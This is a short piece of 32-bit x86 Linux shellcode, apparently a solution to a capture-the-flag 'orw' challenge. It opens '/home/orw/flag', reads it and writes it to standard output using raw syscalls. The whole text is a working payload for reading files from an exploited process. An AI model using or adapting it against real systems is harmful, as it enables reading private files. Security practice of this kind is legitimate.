mov eax,5
xor ecx,ecx
xor edx,edx
push ecx
push 0x67616c66
push 0x2f2f2f77
push 0x726f2f65
push 0x6d6f682f
mov ebx,esp
int 0x80

mov ebx,eax
mov eax,3
mov ecx, 0x0804a100
mov edx, 100
int 0x80

mov eax,4
mov ebx,1
mov ecx,0x804a100
int 0x80

mov eax,1
mov ebx,0
int 0x80









